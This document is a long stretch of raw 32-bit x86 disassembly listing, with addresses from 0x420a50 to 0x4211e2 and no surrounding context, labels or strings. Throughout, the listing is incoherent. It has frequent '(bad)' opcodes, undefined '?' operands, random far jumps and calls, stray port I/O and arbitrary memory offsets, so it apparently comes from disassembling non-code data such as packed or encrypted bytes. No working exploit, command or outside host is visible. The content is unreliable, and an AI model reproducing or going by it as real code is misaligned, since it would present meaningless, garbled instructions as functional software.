  420a50:	push   0x7d51ecc
  420a55:	fistp  DWORD PTR [edi-0x54]
  420a58:	(bad)  
  420a59:	sbb    al,0x54
  420a5b:	mov    DWORD PTR [ecx-0x53af8ccd],ecx
  420a61:	pop    esp
  420a62:	shl    DWORD PTR [ecx+0x2b5b9e04],1
  420a68:	pop    eax
  420a69:	fild   QWORD PTR [eax+0x1e8df71d]
  420a6f:	push   ss
  420a70:	dec    eax
  420a71:	jne    0x4209f4
  420a73:	cld    
  420a74:	mov    ebx,0x4770824d
  420a79:	dec    edx
  420a7a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420a7b:	xchg   ebx,eax
  420a7c:	retf   0xc4ca
  420a7f:	ret    
  420a80:	stos   BYTE PTR es:[edi],al
  420a81:	pop    ss
  420a82:	push   ds
  420a83:	xchg   esp,eax
  420a84:	jl     0x420a1b
  420a86:	int    0x21
  420a88:	fsub   QWORD PTR [ebx+0xf]
  420a8b:	call   DWORD PTR [eax+0x4041b706]
  420a91:	cmp    eax,0x8923a81
  420a96:	(bad)  
  420a99:	mov    al,0xba
  420a9b:	pop    edx
  420a9c:	mov    ch,0xf1
  420a9e:	div    DWORD PTR [ebx+0x5b8f7565]
  420aa4:	sub    dl,BYTE PTR ds:0x807d6ef6
  420aaa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420aab:	out    dx,al
  420aac:	jp     0x420b17
  420aae:	bound  edi,QWORD PTR [esi]
  420ab0:	sbb    ecx,edi
  420ab2:	jecxz  0x420a83
  420ab4:	mov    BYTE PTR [ebx],dl
  420ab6:	addr16 mov bl,0xe9
  420ab9:	iret   
  420aba:	test   ebx,eax
  420abc:	lds    esp,FWORD PTR [eax]
  420abe:	repz lock je 0x420a7e
  420ac2:	mov    bl,0xc3
  420ac4:	sbb    al,0x81
  420ac6:	mov    dh,0x3e
  420ac8:	sbb    ebp,DWORD PTR [esp+eax*8+0x4fa4789d]
  420acf:	cmp    al,0x42
  420ad1:	lahf   
  420ad2:	sub    bh,BYTE PTR [eax]
  420ad4:	sbb    BYTE PTR [edi-0x26b3c151],bl
  420ada:	adc    BYTE PTR [ebx],bh
  420adc:	xor    dh,BYTE PTR [ebx-0x118c0002]
  420ae2:	pop    eax
  420ae3:	retf   
  420ae4:	lods   al,BYTE PTR ds:[esi]
  420ae5:	(bad)  
  420ae6:	out    0xd0,al
  420ae8:	aam    0xaf
  420aea:	icebp  
  420aeb:	shl    DWORD PTR [ebp-0x60],1
  420aee:	popa   
  420aef:	pop    ebx
  420af0:	pop    ebx
  420af1:	adc    edi,DWORD PTR [esi]
  420af3:	mov    DWORD PTR [ebx+0x317bb70b],ecx
  420af9:	inc    DWORD PTR [eax+0x57]
  420afc:	ins    BYTE PTR es:[edi],dx
  420afd:	xchg   esp,eax
  420afe:	js     0x420adb
  420b00:	dec    esp
  420b01:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420b02:	pop    edi
  420b03:	pop    ebp
  420b04:	adc    BYTE PTR [eax],0xa4
  420b07:	mov    al,0x91
  420b09:	sub    BYTE PTR [ebx-0x614e6641],bh
  420b0f:	mov    cl,0x65
  420b11:	ins    DWORD PTR es:[edi],dx
  420b12:	retf   0x8a3d
  420b15:	jnp    0x420b79
  420b17:	xchg   ebx,eax
  420b18:	aam    0x1e
  420b1a:	cmp    BYTE PTR [edi+0xd],0x2f
  420b1e:	popa   
  420b1f:	dec    eax
  420b20:	sar    ebx,0x1b
  420b23:	ss (bad) 
  420b25:	jge    0x420b7a
  420b27:	loopne 0x420b8d
  420b29:	push   esp
  420b2a:	rep lods eax,DWORD PTR ds:[esi]
  420b2c:	xchg   ecx,eax
  420b2d:	or     eax,0xd5773bb6
  420b32:	stos   BYTE PTR es:[edi],al
  420b33:	cmp    eax,0x6ec9faab
  420b38:	fdivrp st(5),st
  420b3a:	cmp    ebx,edi
  420b3c:	xchg   ecx,eax
  420b3d:	inc    ecx
  420b3e:	jmp    0x420ba9
  420b40:	fdivr  DWORD PTR [edx+0x4d]
  420b43:	rol    DWORD PTR ds:0x88a698ab,cl
  420b49:	loopne 0x420b1e
  420b4b:	iret   
  420b4c:	sub    al,0x9e
  420b4e:	xchg   ecx,eax
  420b4f:	and    DWORD PTR [esi+0x2f0f7a96],edx
  420b55:	enter  0x776d,0xa6
  420b59:	push   esp
  420b5a:	add    BYTE PTR [ebp+0x72134b44],ch
  420b60:	lfs    ecx,FWORD PTR [eax-0x1d5197d8]
  420b67:	jg     0x420bcc
  420b69:	add    ecx,esp
  420b6b:	mov    esi,DWORD PTR [edi]
  420b6d:	mov    BYTE PTR [ebx],cl
  420b6f:	and    bh,ah
  420b71:	and    esi,DWORD PTR [edx]
  420b73:	sub    BYTE PTR [esi-0x71],0xa
  420b77:	(bad)  
  420b78:	test   al,0xe1
  420b7a:	neg    BYTE PTR [edi-0x7e]
  420b7d:	pop    edi
  420b7e:	repz mov ebx,0x5c2ca7f7
  420b84:	pop    ebx
  420b85:	pop    edx
  420b86:	sbb    DWORD PTR [esi+ecx*1-0x189ce6b3],0x61efaef
  420b91:	push   es
  420b92:	shr    BYTE PTR [edx],0x6d
  420b95:	add    dl,BYTE PTR [eax-0x15ba938c]
  420b9b:	pop    es
  420b9c:	arpl   WORD PTR [edx+0xb],si
  420b9f:	sti    
  420ba0:	outs   dx,BYTE PTR ds:[esi]
  420ba1:	(bad)  
  420ba2:	sub    cl,ah
  420ba4:	(bad)  
  420ba5:	outs   dx,BYTE PTR ds:[esi]
  420ba6:	mov    ebp,eax
  420ba8:	dec    ebp
  420ba9:	mov    ah,0x42
  420bab:	lock jb 0x420b4f
  420bae:	ins    DWORD PTR es:[edi],dx
  420baf:	aaa    
  420bb0:	(bad)  [esi-0x6d059d8d]
  420bb6:	xchg   BYTE PTR [ecx-0x4d97f9a9],dl
  420bbc:	dec    eax
  420bbd:	xor    ah,bl
  420bbf:	pop    ds
  420bc0:	(bad)  
  420bc1:	xor    DWORD PTR [ecx-0x128d6597],esp
  420bc7:	out    dx,al
  420bc8:	ret    0x71db
  420bcb:	sbb    bh,bh
  420bcd:	test   eax,0xd1a2d0a9
  420bd2:	mov    ds:0x43b5df8d,eax
  420bd7:	push   edi
  420bd8:	(bad)  
  420bd9:	jb     0x420bf3
  420bdb:	sub    bh,al
  420bdd:	push   ebx
  420bde:	dec    ecx
  420bdf:	cs retf 
  420be1:	out    dx,al
  420be2:	scas   eax,DWORD PTR es:[edi]
  420be3:	add    DWORD PTR [ebx-0x60],edi
  420be6:	je     0x420c63
  420be8:	les    ebx,FWORD PTR [esi+0x2371bbba]
  420bee:	les    edi,FWORD PTR [eax+0x415cc1]
  420bf4:	mov    cs,eax
  420bf6:	adc    bh,dh
  420bf8:	and    al,0x5c
  420bfa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420bfb:	out    0x80,al
  420bfd:	inc    eax
  420bfe:	mov    DWORD PTR ds:0x5f0b9e86,edi
  420c04:	(bad)  
  420c05:	int    0x95
  420c07:	add    eax,0xc59ffd1c
  420c0c:	and    ch,bh
  420c0e:	(bad)  
  420c0f:	sub    DWORD PTR [ebp+0x66494c29],esi
  420c15:	gs in  eax,dx
  420c17:	ds sub eax,0xfaf34283
  420c1d:	push   esp
  420c1e:	sbb    al,0x8
  420c20:	aaa    
  420c21:	xchg   BYTE PTR [edx-0x55],bl
  420c24:	pushf  
  420c25:	cmp    BYTE PTR [eiz*1-0x3187c199],dl
  420c2c:	shl    esi,0x21
  420c2f:	adc    ch,0xba
  420c32:	in     al,dx
  420c33:	and    eax,0xe179e006
  420c38:	push   ebp
  420c39:	adc    al,0x7a
  420c3b:	push   ds
  420c3c:	outs   dx,BYTE PTR ds:[esi]
  420c3d:	rcr    BYTE PTR [ebx],cl
  420c3f:	sub    BYTE PTR [edx+eiz*1],ah
  420c42:	pop    ds
  420c43:	mov    eax,ds:0x2a49844e
  420c48:	lods   eax,DWORD PTR ds:[esi]
  420c49:	(bad)  
  420c4a:	push   ebp
  420c4b:	and    eax,0x5a2bd28a
  420c50:	lock adc ebp,DWORD PTR [ebx+0x32]
  420c54:	imul   ebp,DWORD PTR [edi+0x36],0xffffff88
  420c58:	dec    edi
  420c59:	and    eax,esi
  420c5b:	(bad)  
  420c5c:	sbb    BYTE PTR [eax+0x54f00c31],al
  420c62:	rol    BYTE PTR [ecx],cl
  420c64:	test   DWORD PTR [esi],0x545d037b
  420c6a:	mov    fs,WORD PTR [edx]
  420c6c:	mov    ebx,0x44054b3
  420c71:	sbb    BYTE PTR [edx+ebp*8],dh
  420c74:	arpl   WORD PTR [ebx],bx
  420c76:	(bad)  
  420c77:	xchg   ecx,eax
  420c78:	pop    ecx
  420c79:	sbb    ecx,DWORD PTR [ebx-0xd2e80fc]
  420c7f:	inc    ebx
  420c80:	js     0x420c7c
  420c82:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420c83:	pop    edi
  420c84:	repnz push 0x68
  420c87:	mov    WORD PTR [ebx-0x1b],?
  420c8a:	sti    
  420c8b:	mov    bl,0xd
  420c8d:	push   eax
  420c8e:	adc    al,0x74
  420c90:	jmp    0xd7edb0b3
  420c95:	dec    edi
  420c96:	bsr    ebp,DWORD PTR [edi+0x2c]
  420c9a:	fild   DWORD PTR [edi-0x31]
  420c9d:	mov    ah,0xa1
  420c9f:	jle    0x420cb6
  420ca1:	in     eax,dx
  420ca2:	mov    al,0xf1
  420ca4:	mov    esp,0xe928333e
  420ca9:	(bad)  
  420caa:	jmp    0x420c82
  420cac:	call   0x221b:0x3873cca0
  420cb3:	sbb    eax,0xc21975c2
  420cb8:	not    DWORD PTR [edx+0x18]
  420cbb:	xchg   esi,eax
  420cbc:	pop    esi
  420cbd:	cmp    DWORD PTR [ebp-0x507eb183],esp
  420cc3:	cs pop edx
  420cc5:	test   al,0x67
  420cc7:	and    eax,0x76bf1928
  420ccc:	adc    al,0x82
  420cce:	std    
  420ccf:	mov    ds:0xc5bef558,eax
  420cd4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420cd5:	(bad)  
  420cd6:	(bad)  
  420cd7:	mov    edi,0xf6c9110d
  420cdc:	pop    ecx
  420cdd:	lods   eax,DWORD PTR ds:[esi]
  420cde:	sub    al,0x4a
  420ce0:	cld    
  420ce1:	inc    esp
  420ce2:	cli    
  420ce3:	push   edx
  420ce4:	sti    
  420ce5:	xchg   esp,eax
  420ce6:	push   esi
  420ce7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420ce8:	or     BYTE PTR [edi-0x6eb04486],bh
  420cee:	and    dh,BYTE PTR [ecx]
  420cf0:	jl     0x420d32
  420cf2:	push   ds
  420cf3:	cmp    al,0x5e
  420cf5:	adc    ch,BYTE PTR ds:0x86f91c50
  420cfb:	or     al,0x58
  420cfd:	xlat   BYTE PTR ds:[ebx]
  420cfe:	jno    0x420cd0
  420d00:	adc    esp,DWORD PTR [ebx+0x5f4d29f2]
  420d06:	mov    eax,0xf8eb2e98
  420d0b:	ja     0x420d7b
  420d0d:	ror    dh,cl
  420d0f:	jbe    0x420ca8
  420d11:	popa   
  420d12:	jle    0x420d52
  420d14:	loope  0x420d15
  420d16:	adc    DWORD PTR [ebx+0x4af87ec6],ebx
  420d1c:	fistp  QWORD PTR [edi]
  420d1e:	test   eax,0xdacca545
  420d23:	mov    ?,WORD PTR [ecx+0x58]
  420d26:	xor    DWORD PTR [ecx],eax
  420d28:	mov    cl,0x76
  420d2a:	mov    WORD PTR [ebx],gs
  420d2c:	sub    eax,0xd7f758b7
  420d31:	ja     0x420cfd
  420d33:	push   ss
  420d34:	(bad)  
  420d36:	and    eax,0xd6d21008
  420d3b:	adc    edi,DWORD PTR [ebx]
  420d3d:	push   edx
  420d3e:	fistp  WORD PTR [eax]
  420d40:	sub    bl,BYTE PTR [ecx+0x13e36a2f]
  420d46:	and    BYTE PTR [ebp-0x43],ah
  420d49:	add    dh,ah
  420d4b:	ss adc cl,ah
  420d4e:	jg     0x420d01
  420d50:	fmul   DWORD PTR [ebp-0x3c189bc3]
  420d56:	scas   al,BYTE PTR es:[edi]
  420d57:	xor    DWORD PTR [ecx],ebp
  420d59:	sbb    eax,edx
  420d5b:	mov    DWORD PTR [ebp-0xa],eax
  420d5e:	je     0x420d47
  420d60:	call   0x2f9f4d5e
  420d65:	pop    edi
  420d66:	not    BYTE PTR [eax+0x5ca1d71]
  420d6c:	or     DWORD PTR [edx-0x6],esi
  420d6f:	gs test eax,0xfa812904
  420d75:	adc    bl,bl
  420d77:	or     ch,bl
  420d79:	jae    0x420cfc
  420d7b:	add    eax,0x56d76250
  420d80:	mov    bh,0xfa
  420d82:	jmp    0x2e106695
  420d87:	call   0xc80f:0x552226cb
  420d8e:	mov    ch,0x2
  420d90:	xchg   ecx,eax
  420d91:	and    al,BYTE PTR [esi]
  420d93:	xchg   esp,edi
  420d95:	cwde   
  420d96:	fild   DWORD PTR [esi]
  420d98:	test   al,0x92
  420d9a:	vaddsd xmm0,xmm4,xmm6
  420d9e:	adc    dl,BYTE PTR [edx]
  420da0:	sbb    BYTE PTR [ecx-0x50],bh
  420da3:	cwde   
  420da4:	mov    ds:0x2f257929,al
  420da9:	fs sub edi,esp
  420dac:	mov    bh,0x25
  420dae:	scas   al,BYTE PTR es:[edi]
  420daf:	jmp    0x67c0:0x84608c0b
  420db6:	jp     0x420dbc
  420db8:	dec    eax
  420db9:	jge    0x420e0b
  420dbb:	mov    ebx,ds
  420dbd:	aam    0x0
  420dbf:	not    ebp
  420dc1:	or     al,0x3
  420dc3:	pusha  
  420dc4:	cmp    edx,DWORD PTR [eax]
  420dc6:	call   0xac643c4b
  420dcb:	push   es
  420dcc:	test   BYTE PTR [edi+0x29],ch
  420dcf:	mov    esp,0x6896d372
  420dd4:	in     eax,dx
  420dd5:	lahf   
  420dd6:	mov    WORD PTR [esi+0x6f],?
  420dd9:	lahf   
  420dda:	sbb    al,BYTE PTR [ebp+0x58]
  420ddd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420dde:	out    0xa3,ax
  420de1:	test   eax,0x2d8db3d4
  420de6:	gs dec edx
  420de8:	push   DWORD PTR [ebp+0xc]
  420deb:	ret    0x9260
  420dee:	test   eax,0x3e83a066
  420df3:	clc    
  420df4:	xor    edx,DWORD PTR [ebx+0x6f]
  420df7:	xlat   BYTE PTR ds:[ebx]
  420df8:	sub    DWORD PTR [ebx-0xf1eb22a],edi
  420dfe:	test   al,0x9
  420e00:	pusha  
  420e01:	pop    esi
  420e02:	cld    
  420e03:	jp     0x420d8d
  420e05:	push   edx
  420e06:	hlt    
  420e07:	fimul  WORD PTR [eax]
  420e09:	pushf  
  420e0a:	cmp    bh,BYTE PTR [eax+0x4f]
  420e0d:	jg     0x420e62
  420e0f:	daa    
  420e10:	push   cs
  420e11:	xchg   DWORD PTR [esi-0x56b278eb],ecx
  420e17:	lods   al,BYTE PTR ds:[esi]
  420e18:	pop    ebx
  420e19:	jnp    0x420e2b
  420e1b:	xor    eax,DWORD PTR [eax+eax*1]
  420e1e:	sbb    esp,ecx
  420e20:	(bad)  
  420e22:	out    dx,eax
  420e23:	push   ecx
  420e24:	jge    0x420e97
  420e26:	pop    ebx
  420e27:	jns    0x420db6
  420e29:	mov    esi,0x3f92201b
  420e2e:	add    BYTE PTR [ecx+0x5d],ch
  420e31:	mov    ds:0xf6a0e249,eax
  420e36:	cmp    BYTE PTR [edi],al
  420e38:	cmp    DWORD PTR [esi+0x58161d94],0xffffffd8
  420e3f:	imul   ebx,DWORD PTR [edx-0x1c],0x2f
  420e43:	sbb    eax,0x1305fd40
  420e48:	(bad)  
  420e4a:	xchg   esi,eax
  420e4b:	stos   BYTE PTR es:[edi],al
  420e4c:	ja     0x420ea1
  420e4e:	pop    edx
  420e4f:	sbb    DWORD PTR [esi],ebx
  420e51:	sbb    al,0x27
  420e53:	xor    BYTE PTR [esi-0x6489036e],cl
  420e59:	cli    
  420e5a:	push   ecx
  420e5b:	test   al,0xf4
  420e5d:	jge    0x420e7e
  420e5f:	pop    DWORD PTR [edi+eax*1-0x1]
  420e63:	sbb    bl,bh
  420e65:	mov    esi,DWORD PTR [edx+0x7d]
  420e68:	jmp    0xaa26:0x9f194902
  420e6f:	and    eax,0x1a18f41e
  420e74:	lods   al,BYTE PTR ds:[esi]
  420e75:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420e76:	loopne 0x420ea3
  420e78:	dec    ebx
  420e79:	dec    ebx
  420e7a:	jae    0x420ee9
  420e7c:	xchg   esp,eax
  420e7d:	jge    0x420ef9
  420e7f:	mov    esi,0xe9c2a222
  420e84:	sahf   
  420e85:	sti    
  420e86:	hlt    
  420e87:	and    al,0x96
  420e89:	sub    ah,bl
  420e8b:	ss jl  0x420e47
  420e8e:	cmc    
  420e8f:	ins    DWORD PTR es:[edi],dx
  420e90:	adc    BYTE PTR [esi],0x7d
  420e93:	(bad)  ds:0xa11699ae
  420e99:	jle    0x420e2a
  420e9b:	sub    BYTE PTR [edx+ebx*2+0x79],ch
  420e9f:	mov    bh,BYTE PTR [ecx+0x465acb01]
  420ea5:	fnstsw WORD PTR [esi-0x89c6936]
  420eab:	retf   
  420eac:	adc    bl,BYTE PTR [ebx+0x72]
  420eaf:	setp   BYTE PTR [edi+0x617bcc48]
  420eb6:	lea    esi,[edi+0x78ae0606]
  420ebc:	mov    cl,0xf6
  420ebe:	and    BYTE PTR ds:0x724b79c4,ah
  420ec4:	jge    0x420ee9
  420ec6:	jae    0x420e55
  420ec8:	nop
  420ec9:	clc    
  420eca:	ret    
  420ecb:	test   BYTE PTR [ecx-0xf],bh
  420ece:	pop    edx
  420ecf:	mov    eax,ds:0x3ea85b06
  420ed4:	xor    eax,0x46ca6cf9
  420ed9:	add    DWORD PTR [edi-0x359e1d2],ebp
  420edf:	not    DWORD PTR [eax-0xf]
  420ee2:	pusha  
  420ee3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420ee4:	ficom  DWORD PTR [edi-0x5e]
  420ee7:	mov    ah,BYTE PTR [edx+0x34094938]
  420eed:	cmp    DWORD PTR [edi-0x21ea049b],0x568e6667
  420ef7:	xlat   BYTE PTR ds:[ebx]
  420ef8:	dec    esp
  420ef9:	inc    ebx
  420efa:	mov    edx,DWORD PTR [ecx+0x67564f24]
  420f00:	nop
  420f01:	sub    BYTE PTR [edx],0xb2
  420f04:	sub    cl,BYTE PTR [ecx+0x5c]
  420f07:	nop
  420f08:	jb     0x420ed8
  420f0a:	xchg   esi,eax
  420f0b:	hlt    
  420f0c:	addr16 add ch,ah
  420f0f:	in     al,dx
  420f10:	xor    edi,DWORD PTR [ebx-0x7b3550fe]
  420f16:	scas   al,BYTE PTR es:[edi]
  420f17:	adc    DWORD PTR [eax-0x55],eax
  420f1a:	and    dh,dh
  420f1c:	adc    al,0xf5
  420f1e:	jns    0x420f5d
  420f20:	inc    eax
  420f21:	pop    esi
  420f22:	mov    bx,0x41ec
  420f26:	popa   
  420f27:	popa   
  420f28:	mov    eax,0xca52149
  420f2d:	xchg   ebp,eax
  420f2e:	bound  ebp,QWORD PTR [esi+edi*8-0x74bfd433]
  420f35:	or     al,0x24
  420f37:	xchg   edx,eax
  420f38:	sbb    ch,ch
  420f3a:	popf   
  420f3b:	daa    
  420f3c:	data16 rol BYTE PTR es:[eax-0x31965ba9],cl
  420f44:	mov    ah,0xd5
  420f46:	imul   ebp,DWORD PTR [eax],0x598d81f
  420f4c:	xchg   ebp,eax
  420f4d:	push   esi
  420f4e:	ja     0x420f33
  420f50:	les    ebx,FWORD PTR [ebp+0x24]
  420f53:	test   eax,0x47c2f52c
  420f58:	test   BYTE PTR [edi],bh
  420f5a:	ret    0xd96a
  420f5d:	rcl    BYTE PTR [ebx],0x4b
  420f60:	mov    bl,0x96
  420f62:	or     dl,ch
  420f64:	pop    eax
  420f65:	ret    0xc8a1
  420f68:	pop    eax
  420f69:	sub    al,0x71
  420f6b:	or     eax,0x66885eec
  420f70:	js     0x420f85
  420f72:	jns    0x420f1c
  420f74:	mov    edi,esi
  420f76:	sub    al,0x45
  420f78:	mov    bh,0xcd
  420f7a:	mov    ch,0xb4
  420f7c:	movzx  edi,BYTE PTR [ebp+0xc8beca2]
  420f83:	xlat   BYTE PTR ds:[ebx]
  420f84:	fimul  DWORD PTR [edx]
  420f86:	lahf   
  420f87:	imul   esi,eax,0xffffffd7
  420f8a:	add    BYTE PTR [ebp-0x71],0xde
  420f8e:	inc    esi
  420f8f:	mov    ds:0x5c2ffa15,al
  420f94:	mov    dh,0xd1
  420f96:	ja     0x420ff0
  420f98:	jge    0x420fcd
  420f9a:	cmp    al,0x1
  420f9c:	xor    DWORD PTR [edx],ecx
  420f9e:	add    BYTE PTR [edx],al
  420fa0:	test   BYTE PTR [ecx],dh
  420fa2:	and    DWORD PTR [ebx+0x4e],ebx
  420fa5:	adc    DWORD PTR [esp+edx*8-0x7f],esi
  420fa9:	daa    
  420faa:	pop    ebx
  420fab:	fidiv  DWORD PTR [ebx+0x42b13963]
  420fb1:	jmp    0x420fe1
  420fb3:	imul   esp,DWORD PTR [eax],0x9a5f16f6
  420fb9:	aam    0xc7
  420fbb:	inc    esi
  420fbc:	fwait
  420fbd:	pop    ebp
  420fbe:	jo     0x420f7c
  420fc0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420fc1:	sub    eax,0xb1c5d13
  420fc6:	stos   DWORD PTR es:[edi],eax
  420fc7:	out    dx,al
  420fc8:	push   esp
  420fc9:	out    0x29,eax
  420fcb:	cld    
  420fcc:	and    bh,ch
  420fce:	mov    bl,0x40
  420fd0:	shl    DWORD PTR [eax-0x5f],0xca
  420fd4:	repnz aas 
  420fd6:	mov    cl,0x80
  420fd8:	xor    esp,DWORD PTR [esi+0x7ea40188]
  420fde:	test   al,0xcc
  420fe0:	mov    BYTE PTR [esi+edx*4+0x4f],bh
  420fe4:	push   es
  420fe5:	rcr    eax,0xda
  420fe8:	pop    edx
  420fe9:	stc    
  420fea:	add    esp,ebp
  420fec:	cdq    
  420fed:	or     bh,BYTE PTR [ecx+0x19]
  420ff0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420ff1:	or     ch,BYTE PTR [esi]
  420ff3:	xor    DWORD PTR [ebp+0x29020e10],esp
  420ff9:	lds    ebp,FWORD PTR [ebp+0x4a]
  420ffc:	and    DWORD PTR [esi],esp
  420ffe:	ins    DWORD PTR es:[edi],dx
  420fff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421000:	mov    esp,esi
  421002:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421003:	(bad)  [ecx]
  421005:	ja     0x420fbe
  421007:	js     0x421071
  421009:	paddd  mm6,mm2
  42100c:	xor    edi,DWORD PTR [eax-0x25]
  42100f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421010:	fld    QWORD PTR [edi+0x23b18398]
  421016:	(bad)  
  421018:	adc    ebx,ebp
  42101a:	xlat   BYTE PTR ds:[ebx]
  42101b:	mov    eax,ds:0xc9fb8b56
  421020:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421021:	or     BYTE PTR [esp+ecx*2+0x26cd027d],bh
  421028:	jmp    0x903264f1
  42102d:	sub    DWORD PTR [edx],edi
  42102f:	not    DWORD PTR [ecx-0x3f]
  421032:	mov    es,ecx
  421034:	xchg   esp,eax
  421035:	sbb    eax,0x97f18478
  42103a:	sub    ecx,esi
  42103c:	push   cs
  42103d:	jae    0x42103d
  42103f:	jns    0x421077
  421041:	and    eax,0x4b43057d
  421046:	jecxz  0x421007
  421048:	jmp    0x661f:0xb101c07b
  42104f:	sbb    BYTE PTR [eax-0x46],0x36
  421053:	mov    cl,BYTE PTR [ecx+0x785033c2]
  421059:	push   esp
  42105a:	sbb    BYTE PTR [ebx],bl
  42105c:	fnstcw WORD PTR [edx-0x226916a0]
  421062:	adc    ah,BYTE PTR [edi+ecx*4-0x1]
  421066:	sti    
  421067:	clc    
  421068:	(bad)  
  421069:	jnp    0x42109a
  42106b:	mov    ebp,0xa0c34ce2
  421070:	or     eax,0x6c44fc5d
  421075:	push   edx
  421076:	jg     0x4210ea
  421078:	mov    bl,0xb6
  42107a:	jns    0x420fff
  42107c:	xchg   edi,eax
  42107d:	nop
  42107e:	leave  
  42107f:	sbb    al,0xac
  421081:	add    BYTE PTR [ebx-0x7c1a621a],cl
  421087:	sar    BYTE PTR [ebx],cl
  421089:	jne    0x421026
  42108b:	in     eax,dx
  42108c:	mov    al,0xf3
  42108e:	retf   0x881
  421091:	test   BYTE PTR [edx],0xda
  421094:	cmc    
  421095:	inc    ebp
  421096:	test   eax,0xd822e7af
  42109b:	add    edx,DWORD PTR [esi-0x2d]
  42109e:	and    eax,0x66f15814
  4210a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4210a4:	daa    
  4210a5:	pop    ss
  4210a6:	mov    DWORD PTR [eax+esi*2],esi
  4210a9:	fwait
  4210aa:	cmp    DWORD PTR [esi-0x61],0x7b4aa9ee
  4210b1:	lods   eax,DWORD PTR ds:[esi]
  4210b2:	sub    al,0x81
  4210b4:	sub    BYTE PTR [ebx],bh
  4210b6:	enter  0x1ca0,0xf1
  4210ba:	sti    
  4210bb:	shl    eax,0xc3
  4210be:	mov    dh,0x72
  4210c0:	xchg   DWORD PTR ss:[esi],eax
  4210c3:	sbb    dh,dh
  4210c5:	ss cmp dh,al
  4210c8:	ja     0x4210e5
  4210ca:	sub    dl,dl
  4210cc:	mov    ds:0x4ffd1ce8,eax
  4210d1:	xor    eax,0x70b16d42
  4210d6:	repnz loope 0x4210e1
  4210d9:	dec    ebp
  4210da:	and    al,0xe1
  4210dc:	jno    0x42106e
  4210de:	fadd   DWORD PTR [ecx-0x20a3810b]
  4210e4:	retf   0x661b
  4210e7:	inc    ebp
  4210e8:	ins    DWORD PTR es:[edi],dx
  4210e9:	call   0xe150ab54
  4210ee:	bound  ebx,QWORD PTR [eax+0x17]
  4210f1:	(bad)  
  4210f2:	jns    0x4210dc
  4210f4:	hlt    
  4210f5:	in     eax,dx
  4210f6:	shl    ch,cl
  4210f8:	nop
  4210f9:	int    0x66
  4210fb:	hlt    
  4210fc:	or     BYTE PTR [eax-0x22],dh
  4210ff:	lock inc eax
  421101:	scas   al,BYTE PTR es:[edi]
  421102:	lock mov DWORD PTR [edx-0x32244ceb],eax
  421109:	mov    bl,BYTE PTR [ecx]
  42110b:	jl     0x42110c
  42110d:	xor    bh,bl
  42110f:	adc    eax,0x66bed9eb
  421114:	dec    ebp
  421115:	adc    ecx,DWORD PTR [ecx+edx*2]
  421118:	je     0x421102
  42111a:	pop    ds
  42111b:	or     bl,BYTE PTR [ecx+esi*2+0x18]
  42111f:	test   al,dh
  421121:	pusha  
  421122:	cmp    BYTE PTR ds:0x302a44cc,al
  421128:	(bad)  
  421129:	out    dx,eax
  42112a:	addr16 pop edx
  42112c:	xchg   DWORD PTR [ecx],edi
  42112e:	ins    BYTE PTR es:[edi],dx
  42112f:	sub    bl,BYTE PTR ds:0x451d9632
  421135:	inc    ecx
  421136:	dec    edi
  421137:	rcl    ebp,cl
  421139:	mov    esi,0xbff68836
  42113e:	fadd   DWORD PTR ds:0x8386ae30
  421144:	dec    ebp
  421145:	push   esp
  421146:	inc    esp
  421147:	ss call 0x611aa060
  42114d:	push   cs
  42114e:	jns    0x4211b0
  421150:	retf   0x3da3
  421153:	fbstp  TBYTE PTR [ecx-0x20]
  421156:	inc    esp
  421157:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421158:	xchg   BYTE PTR [ebx],dl
  42115a:	xchg   ebp,eax
  42115b:	lock push es
  42115d:	loop   0x421179
  42115f:	inc    edi
  421160:	sub    eax,0x417d182f
  421165:	cmc    
  421166:	arpl   WORD PTR [edi-0x41858a92],bp
  42116c:	stos   DWORD PTR es:[edi],eax
  42116d:	pop    ds
  42116e:	jp     0x421183
  421170:	cmp    DWORD PTR [edx],0xffffffc7
  421173:	pop    eax
  421174:	sub    DWORD PTR [ebx+edi*8],0xffffffb2
  421178:	xor    eax,0x9cfed135
  42117d:	bound  edi,QWORD PTR [eax-0x5a96832a]
  421183:	ret    0x3780
  421186:	test   eax,0xad1789e0
  42118b:	jle    0x421126
  42118d:	and    al,BYTE PTR [ecx-0x32]
  421190:	sahf   
  421191:	mov    al,0x93
  421193:	pop    DWORD PTR [ecx+0x73ea5c01]
  421199:	sbb    BYTE PTR [edi+0x2b],al
  42119c:	inc    edx
  42119d:	jo     0x421152
  42119f:	sub    al,0xf6
  4211a1:	cmp    eax,DWORD PTR [ebp+0x65ba6cc5]
  4211a7:	shl    BYTE PTR ds:[ebp+0x1d],cl
  4211ab:	out    0xf4,al
  4211ad:	adc    dh,dl
  4211af:	retf   
  4211b0:	sbb    esp,DWORD PTR [ecx-0x6d32fda2]
  4211b6:	inc    ebx
  4211b7:	adc    DWORD PTR [esi],esp
  4211b9:	rcr    BYTE PTR [edi],cl
  4211bb:	in     eax,dx
  4211bc:	mov    esp,DWORD PTR [ecx-0x205c61da]
  4211c2:	add    ebp,DWORD PTR [eax]
  4211c4:	jnp    0x4211ed
  4211c6:	sub    dh,ch
  4211c8:	cs out dx,eax
  4211ca:	xor    eax,0x193c6676
  4211cf:	cmp    eax,0x28b7076f
  4211d4:	and    ebp,DWORD PTR [eax]
  4211d6:	add    al,0x29
  4211d8:	sahf   
  4211d9:	aaa    
  4211da:	out    0xc8,eax
  4211dc:	sub    DWORD PTR [eax+0x2fc9e3b2],ebx
  4211e2:	ret    0xca6c
